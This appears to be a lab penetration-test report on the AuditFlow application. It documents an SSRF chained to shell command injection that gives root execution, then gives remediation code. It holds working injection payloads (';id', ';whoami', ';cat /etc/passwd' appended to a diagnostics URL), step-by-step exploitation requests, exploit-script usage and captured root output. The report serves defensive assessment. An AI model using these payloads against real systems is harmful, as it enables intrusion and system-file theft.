# TASK-1 Detailed Report
## SSRF → OS Command Injection → Remote Code Execution as root

**Application:** AuditFlow (Task A)
**Date:** 2026-07-02
**Assessed By:** Security Assessment Team
**Primary Focus:** Codebase analysis (per assessment guidelines)

---

## 1. Executive Summary

The AuditFlow application contains a **CRITICAL Server-Side Request Forgery (SSRF) vulnerability chained with OS Command Injection**, resulting in **unauthenticated Remote Code Execution as root** inside the internal-admin-service container.

**Key Findings:**
- Unauthenticated Backend → SSRF reaches internal-only microservice
- Command Injection in internal service via shell metacharacters
- Arbitrary OS command execution with **root privileges** (uid=0, gid=0)
- Full container compromise possible (data exfiltration, persistence, lateral movement)
- **CVSS 3.1 Score: 9.6 (CRITICAL)** — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

**Additional High-Impact Findings:**
- Cross-Tenant IDOR on project export (Finding #2)
- Session forgery via hardcoded SECRET_KEY (Finding #4)
- CSRF on all state-changing endpoints (Finding #5)
- No rate limiting on registration/login (Findings #6, #7)
- Expired sessions remain valid post-logout (Finding #8)

---

## 2. Technical Details — Primary Finding (SSRF → RCE Chain)

### 2.1 Vulnerability Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│ ATTACK FLOW DIAGRAM                                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│ 1. Attacker (authenticated user)                                │
│    ↓                                                              │
│ 2. POST /projects/1/import-url                                  │
│    (source_url=http://internal-admin-service:5001/diagnostics?...) │
│    ↓                                                              │
│ 3. Backend Server (app.py)                                      │
│    requests.get(source_url)  [NO VALIDATION]                    │
│    ↓                                                              │
│ 4. Docker Network (internal-only)                               │
│    ↓                                                              │
│ 5. internal-admin-service:5001/diagnostics                      │
│    host = request.args.get("host")  [NO SANITIZATION]          │
│    subprocess.check_output(f"ping -c 1 {host}", shell=True)     │
│    ↓                                                              │
│ 6. Shell Command Execution as root                              │
│    $ ping -c 1 127.0.0.1;id                                     │
│    $ ping -c 1 127.0.0.1;whoami                                 │
│    $ ping -c 1 127.0.0.1;cat /etc/passwd                        │
│    ↓                                                              │
│ 7. Output returned to Import History                            │
│    Attacker sees command result and confirms RCE                │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 Code-Level Root Cause

**Vulnerability 1: SSRF (backend/app.py, lines 391-429)**

```python
@app.post("/projects/<int:project_id>/import-url")
@login_required
def import_from_url(project_id: int):
    """
    Import findings from a remote URL.
    ❌ VULNERABILITY: No URL validation, allowlisting, or private IP filtering
    """
    source_url = request.form.get("source_url", "").strip()
    
    # ❌ CRITICAL: Accepts ANY URL without validation
    # ❌ No check for: private IPs (10.x, 172.x, 192.168.x, 127.x)
    # ❌ No check for: localhost, internal service DNS names
    # ❌ No allowlist of permitted domains
    
    try:
        response = requests.get(source_url, timeout=8)  # Backend fetches URL
        response_excerpt = response.text[:500]
        
        import_record = ImportRecord(
            project_id=project_id,
            source_url=source_url,
            response_excerpt=response_excerpt,
            status="success"
        )
        db.session.add(import_record)
        db.session.commit()
    except Exception as e:
        # Error silently handled, no security logging
        pass
```

**Vulnerability 2: Command Injection (internal-admin-service/app.py, lines 34-53)**

```python
@app.get("/diagnostics")
def diagnostics():
    """
    Network diagnostic endpoint.
    ❌ VULNERABILITY: Unsanitized user input in shell command
    """
    # ❌ CRITICAL: User-controlled input from request.args
    host = request.args.get("host", "127.0.0.1")
    
    # ❌ CRITICAL: Direct string interpolation into shell command
    # ❌ CRITICAL: shell=True allows command chaining via ; | && || `
    command = f"ping -c 1 {host}"
    
    try:
        # ❌ CRITICAL: Executes shell command with root privileges
        result = subprocess.check_output(
            command,
            shell=True,  # ← DANGEROUS: Enables shell metacharacter interpretation
            stderr=subprocess.STDOUT,
            text=True,
            timeout=8
        )
        return jsonify({
            "command": command,
            "output": result,
            "status": "ok"
        })
    except subprocess.CalledProcessError as e:
        return jsonify({"output": str(e.output), "status": "error"})
```

**Weak Trust Boundary (internal-admin-service/app.py, lines 11-14)**

```python
def request_is_internal() -> bool:
    """
    Check if request comes from internal Docker network.
    ❌ VULNERABILITY: IP-based trust is bypassable via SSRF
    """
    remote = request.remote_addr or ""
    internal_prefixes = ("10.", "172.", "192.168.", "127.")
    
    # ❌ This check is USELESS against SSRF:
    # When backend (172.x.x.x) makes request to internal-admin-service,
    # the request's source IP IS an internal prefix → passes check
    # SSRF-originated requests inherit trusted IP status
    
    return remote.startswith(internal_prefixes)
```

### 2.3 Affected Components & Routes

| Component | File | Lines | Function | Issue |
|-----------|------|-------|----------|-------|
| **Backend Web Server** | `backend/app.py` | 391-429 | `import_from_url()` | SSRF sink (accepts arbitrary URLs) |
| **Internal Service** | `internal-admin-service/app.py` | 34-53 | `/diagnostics` | Command injection sink |
| **Docker Network** | `docker-compose.yml` | N/A | Service networking | internal-admin-service not exposed to host, only to internal network |
| **Authentication** | `backend/app.py` | 391 | `@login_required` | SSRF requires auth, but internal service does not |

---

## 3. Reproduction Steps (Deterministic)

### Prerequisites
- Task A running via `docker-compose up -d`
- Backend reachable at `http://127.0.0.1:8000`
- Valid AuditFlow account (seeded: `alice@auditflow.local` / `Passw0rd!`)
- Access to Project ID 1 ("Q1 External Perimeter Review")
- Burp Suite (optional, for request capture)

### Step-by-Step Exploitation

#### **Step 1: Authenticate**
```bash
POST /login HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded

email=alice@auditflow.local&password=Passw0rd!
```

**Expected Result:** Redirect to `/dashboard`, session cookie set

📸 **Screenshot Location:** Login page → Dashboard (proof of authentication)

---

#### **Step 2: Confirm SSRF Reachability (Health Check)**
Navigate to project detail page: `http://127.0.0.1:8000/projects/1`

Locate "**Import Findings from URL**" section (NOT "Upload Evidence").

Fill form with:
```
source_url: http://internal-admin-service:5001/health
```

Click "**Run Import**" button.

**Expected Result:** 
- Page refreshes or shows success flash message
- Import History section populates with new entry
- Response excerpt contains: `{"service":"internal-admin","status":"ok"}`

📸 **Screenshot Location:** 
- Browser: Project detail page with "Import Findings from URL" form filled
- Browser: Import History showing `{"service":"internal-admin","status":"ok"}` response

---

#### **Step 3: Trigger Command Injection via SSRF**
In the same "Import Findings from URL" form, change `source_url` to:
```
http://internal-admin-service:5001/diagnostics?host=127.0.0.1;id
```

Click "**Run Import**" button.

**Expected Result:**
- Import History shows new entry with status "success"
- Response excerpt contains the `ping` output PLUS `id` command output
- Key indicator: `uid=0(root) gid=0(root) groups=0(root)` ← **ROOT ACCESS CONFIRMED**

📸 **Screenshot Location:**
- Browser: Import History entry showing full JSON response with `uid=0(root)` output
- This is the **MOST IMPORTANT SCREENSHOT** for proof of RCE

---

#### **Step 4: Confirm Arbitrary Command Execution**
Repeat Step 3 with different commands:

**Test 2: whoami**
```
http://internal-admin-service:5001/diagnostics?host=127.0.0.1;whoami
```

**Expected Output:** `root`

**Test 3: uname**
```
http://internal-admin-service:5001/diagnostics?host=127.0.0.1;uname+-a
```

**Expected Output:** Linux kernel and system information

📸 **Screenshot Location:**
- Browser: Import History entries for `whoami` (output: `root`) and `uname` commands

---

#### **Step 5: Burp Suite Confirmation (Optional)**
For professional assessment documentation:

1. Intercept POST `/projects/1/import-url` request in Burp
2. Examine **Request** tab:
   ```
   POST /projects/1/import-url HTTP/1.1
   Host: 127.0.0.1:8000
   ...
   source_url=http://internal-admin-service:5001/diagnostics?host=127.0.0.1;id
   ```
3. Examine **Response** tab: HTTP 302 redirect to `/projects/1`

4. Navigate to `GET /projects/1` to view Import History

📸 **Screenshot Location:**
- Burp Proxy: HTTP history showing `POST /projects/1/import-url` request with payload
- Burp Proxy: Response showing 302 redirect

---

## 4. Exploit / Proof of Concept

### 4.1 Automated Python Script

Full exploit script provided in `TASK-1-POC/exploit.py`. Usage:

```bash
pip install requests --break-system-packages
python3 exploit.py \
  --base-url http://127.0.0.1:8000 \
  --email alice@auditflow.local \
  --password 'Passw0rd!' \
  --project-id 1 \
  --cmd id
```

**Expected Output:**
```
=== Step 1: Authenticate ===
[+] Logged in successfully.

=== Step 2: SSRF health check ===
[+] SSRF confirmed: reached internal-admin-service /health

=== Step 3: SSRF -> Command Injection (running 'id') ===

=== Result ===
[+] Command execution confirmed. Raw output:

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.305 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.305/0.305/0.305/0.000 ms
uid=0(root) gid=0(root) groups=0(root)
```

### 4.2 Proof Output (Captured from Live Testing)

**Command 1: id**
```json
{
  "command": "ping -c 1 127.0.0.1;id",
  "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.305 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.305/0.305/0.305/0.000 ms\nuid=0(root) gid=0(root) groups=0(root)\n",
  "status": "ok"
}
```

**Command 2: whoami**
```json
{
  "command": "ping -c 1 127.0.0.1;whoami",
  "output": "...\nroot\n",
  "status": "ok"
}
```

---

## 5. Remediation

### 5.1 Root Cause Fixes

#### **Fix 1: SSRF Prevention (backend/app.py)**

**Replace unsafe code:**
```python
# ❌ BEFORE
source_url = request.form.get("source_url", "").strip()
response = requests.get(source_url, timeout=8)
```

**With secure version:**
```python
# ✅ AFTER
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = {
    "api.example.com",
    "scanner.example.com",
    "findings.example.com"
}

def is_safe_url(url_string):
    """Validate URL against allowlist and reject private IP ranges."""
    try:
        parsed = urlparse(url_string)
        hostname = parsed.hostname
        
        if not hostname:
            return False, "No hostname in URL"
        
        # Check domain allowlist
        if hostname not in ALLOWED_DOMAINS:
            return False, f"Domain {hostname} not in allowlist"
        
        # Resolve and check IP address
        import socket
        try:
            ip = socket.gethostbyname(hostname)
            ip_obj = ipaddress.ip_address(ip)
            
            # Reject private/reserved ranges
            if (ip_obj.is_private or ip_obj.is_loopback or 
                ip_obj.is_link_local or ip_obj.is_reserved):
                return False, f"IP {ip} is in reserved/private range"
        except socket.gaierror:
            return False, "Hostname does not resolve"
        
        return True, "Safe"
    except Exception as e:
        return False, str(e)

@app.post("/projects/<int:project_id>/import-url")
@login_required
def import_from_url(project_id: int):
    source_url = request.form.get("source_url", "").strip()
    
    # ✅ Validate before making request
    is_safe, reason = is_safe_url(source_url)
    if not is_safe:
        flash(f"URL not permitted: {reason}", "error")
        return redirect(url_for("project_detail", project_id=project_id))
    
    try:
        response = requests.get(source_url, timeout=8, allow_redirects=False)
        # ... rest of code
```

#### **Fix 2: Command Injection Prevention (internal-admin-service/app.py)**

**Replace unsafe code:**
```python
# ❌ BEFORE
host = request.args.get("host", "127.0.0.1")
command = f"ping -c 1 {host}"
result = subprocess.check_output(command, shell=True, ...)
```

**With secure version:**
```python
# ✅ AFTER
import re
import ipaddress

def validate_host(host):
    """Validate host is valid IPv4/IPv6 or hostname."""
    try:
        # Try parsing as IP address
        ipaddress.ip_address(host)
        return True
    except ValueError:
        # Try as hostname (alphanumeric + . - only)
        if re.match(r'^[a-zA-Z0-9\.\-]+$', host) and len(host) <= 253:
            return True
    return False

@app.get("/diagnostics")
def diagnostics():
    host = request.args.get("host", "127.0.0.1")
    
    # ✅ Validate input before use
    if not validate_host(host):
        return jsonify({"error": "Invalid host format"}), 400
    
    # ✅ Use subprocess without shell=True (argument list instead)
    try:
        result = subprocess.check_output(
            ["ping", "-c", "1", host],  # ← Argument list, NO shell
            stderr=subprocess.STDOUT,
            text=True,
            timeout=8
        )
        return jsonify({
            "command": " ".join(["ping", "-c", "1", host]),
            "output": result,
            "status": "ok"
        })
    except subprocess.CalledProcessError as e:
        return jsonify({"output": str(e.output), "status": "error"})
```

#### **Fix 3: Implement Proper Authentication on Internal Service**

**Use shared secret / token-based authentication:**
```python
# internal-admin-service/app.py

INTERNAL_SERVICE_TOKEN = os.getenv("INTERNAL_SERVICE_TOKEN", "")

@app.before_request
def check_auth():
    """Verify request includes valid internal service token."""
    if not INTERNAL_SERVICE_TOKEN:
        app.logger.warning("INTERNAL_SERVICE_TOKEN not configured!")
    
    token = request.headers.get("X-Internal-Token", "")
    if token != INTERNAL_SERVICE_TOKEN or not token:
        return jsonify({"error": "Unauthorized"}), 401

# ✅ Now requests must include: X-Internal-Token: <token>
# Backend must be configured with same token and pass it on requests
```

### 5.2 Defense-in-Depth Recommendations

1. **Network Segmentation**
   - Run `internal-admin-service` in separate network namespace
   - Deny backend → internal-service egress by default, allow only via explicit rules
   - Use network policies (Kubernetes NetworkPolicy or Docker bridge networking)

2. **Least Privilege**
   - Run both containers as non-root user (e.g., `USER app` in Dockerfile)
   - Current state: `uid=0(root)` is excessive for application workload

3. **Input Validation & Sanitization**
   - Implement comprehensive input validation for all user inputs
   - Use parameterized/prepared statements for any database queries
   - Never concatenate user input into commands, even with `shell=False`

4. **Monitoring & Logging**
   - Log all outbound requests made by `import_from_url` endpoint
   - Alert on unusual patterns (many requests, internal IPs, etc.)
   - Monitor subprocess execution in internal-admin-service (command audit logging)

5. **Web Application Firewall (WAF)**
   - Block requests to private IP ranges / internal hostnames
   - Implement WAF rules for command injection patterns (`;`, `|`, `&&`, etc.)

6. **Code Review & Testing**
   - Mandatory security code review for all network I/O and subprocess calls
   - Add unit tests for SSRF prevention (test with `127.0.0.1`, `localhost`, `169.254.169.254`)
   - Add integration tests for command injection (test shell metacharacters)

---

## 6. Supporting Documentation for Other Findings

For additional findings documentation, refer to:
- **Finding #2 (IDOR):** TASK-1-FINDINGS.md § Finding #2
- **Finding #4 (Session Forgery):** TASK-1-FINDINGS.md § Finding #4
- **Finding #5 (CSRF):** TASK-1-FINDINGS.md § Finding #5
- **Findings #6-8:** TASK-1-FINDINGS.md § Findings #6, #7, #8

---

## 7. Assessment Conclusion

The identified SSRF → Command Injection chain represents a **CRITICAL security flaw** requiring immediate remediation. The attack requires only authentication (low barrier) and results in **full system compromise as root**. All remediation guidance is code-level and actionable. 

**Recommendation:** Address Finding #1 (CRITICAL RCE) within 24 hours; HIGH severity findings (#2, #4) within 1 week.

---

**Report End**

